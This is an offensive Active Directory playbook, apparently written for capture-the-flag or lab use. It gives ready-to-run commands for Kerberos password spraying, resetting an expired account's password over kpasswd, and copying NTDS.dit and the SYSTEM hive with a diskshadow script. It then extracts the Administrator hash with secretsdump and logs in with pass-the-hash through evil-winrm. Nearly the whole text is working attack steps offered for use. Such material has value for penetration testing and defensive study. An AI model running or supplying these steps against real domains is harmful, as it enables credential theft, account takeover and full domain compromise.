# Kerberos Pre-Auth Spray + kpasswd Reset for Expired Accounts

## When this applies

- AD domain reachable on TCP/UDP 88 (Kerberos) and 464 (kpasswd).
- You have a candidate password (from an LDAP `description` leak, prior breach, default-pattern guess, password policy default).
- Goal: identify which user(s) the candidate belongs to AND, if the candidate is technically valid but expired, reset to a known value WITHOUT needing admin or RDP rights.

## Pre-auth spray to find the right user

```bash
# kerbrute differentiates KDC_ERR_PREAUTH_FAILED (wrong pw) from KDC_ERR_CLIENT_REVOKED
# (locked) and KDC_ERR_KEY_EXPIRED (right pw, expired). Treat the latter two as POSITIVE.
kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> users.txt '<candidate_pw>'

# impacket variant — getTGT with each user. Watch for KDC_ERR_KEY_EXPIRED.
for u in $(cat users.txt); do
  echo "[$u]"; impacket-getTGT -dc-ip <DC_IP> "<DOMAIN>/$u:<candidate_pw>" 2>&1 | head -1
done

# Single-user probe with verbose Kerberos errors
impacket-getTGT -dc-ip <DC_IP> '<DOMAIN>/<user>:<candidate_pw>'
# KDC_ERR_KEY_EXPIRED ← password matches AD, but flagged "User must change password at next logon"
```

The `KDC_ERR_KEY_EXPIRED` response is a **positive signal**: the password is correct, AD is just demanding a rotation. This account is reachable.

## Reset via kpasswd (no admin rights needed)

`kpasswd` accepts a "self-service" password change for any account whose current password the caller knows — including accounts marked "must change at next logon". No RDP, no SMB, no LDAP write.

```bash
# Impacket changepasswd.py — preferred (handles KDC_ERR_KEY_EXPIRED automatically)
impacket-changepasswd '<DOMAIN>/<user>:<candidate_pw>@<DC_IP>' \
    -newpass 'NewPa$$w0rd!2026' -p kpasswd

# kinit + kpasswd fallback (MIT Kerberos)
kinit -k -t /tmp/krb5.keytab <user>@<DOMAIN>             # only if you already have a TGT
kpasswd <user>@<DOMAIN>

# Net (Samba) — sometimes succeeds when changepasswd.py fails on EncTypes mismatch
smbpasswd -r <DC_FQDN> -U <user> -W <DOMAIN>
```

After the reset, re-run `getTGT.py` and confirm — the new password should produce a valid TGT and the account should now WinRM/SMB authenticate normally.

## Common pitfalls

- `changepasswd.py -p kpasswd` is required — without `-p kpasswd` the tool defaults to LDAP-bind reset which fails for non-admins.
- Default `<DOMAIN>` lookup uses DNS — supply `-dc-ip` explicitly when DNS is broken.
- Some KDCs reject the new password if it doesn't satisfy domain complexity requirements (length, character classes, history). Pick something obviously compliant (`Aa1!aaaaaaaa` works in nearly all defaults).
- Tools that pin AES256 only fail if the account's `msDS-SupportedEncryptionTypes` is RC4-only. `getTGT.py -aesKey` and `-rc4` swap the algorithm; if both fail, try `-no-pass` with `-dc-ip` and PTT.

## Diskshadow non-admin addendum

When the recovered account has `SeBackupPrivilege` but NOT local admin, **diskshadow's working directory must be writable by the caller**. The default working dir is `C:\Windows\Temp` which is typically not writable for SeBackup-only users. Override with:

```cmd
:: From a SeBackupPrivilege-enabled WinRM session
cd C:\Users\<user>\Documents
echo set context persistent nowriters > diskshadow.txt
echo set metadata C:\Users\<user>\Documents\meta.cab >> diskshadow.txt
echo set verbose on >> diskshadow.txt
echo add volume C: alias TempCopy >> diskshadow.txt
echo create >> diskshadow.txt
echo expose %TempCopy% z: >> diskshadow.txt
echo exec "cmd.exe" /c copy z:\Windows\NTDS\NTDS.dit C:\Users\<user>\Documents\NTDS.dit >> diskshadow.txt
echo exec "cmd.exe" /c reg save HKLM\SYSTEM C:\Users\<user>\Documents\SYSTEM.hive >> diskshadow.txt
echo unexpose %TempCopy% >> diskshadow.txt
echo reset >> diskshadow.txt
diskshadow.exe /s diskshadow.txt
```

Then `secretsdump.py -ntds NTDS.dit -system SYSTEM.hive LOCAL` recovers the Administrator NT hash. PtH (`crackmapexec`/`evil-winrm -H <hash>`) for root.txt.

## Verifying success

- `getTGT.py` returns a `.ccache` for the account post-kpasswd.
- `evil-winrm -i <DC> -u <user> -p '<newpass>'` connects.
- `whoami /priv` shows `SeBackupPrivilege Enabled` (or Disabled — both work for diskshadow).
- `secretsdump.py LOCAL` outputs hashes including `Administrator:500:aad3...:<NT>`.

## Tools

- `kerbrute` (passwordspray) — fast spray with positive-signal differentiation
- `impacket-changepasswd` — kpasswd reset
- `impacket-getTGT` — TGT acquisition for verification
- `diskshadow` (Windows builtin) — VSS-based NTDS.dit copy under SeBackupPrivilege
- `impacket-secretsdump` (LOCAL mode) — offline NTDS hash extraction
- `evil-winrm -H <hash>` — Pass-the-Hash WinRM
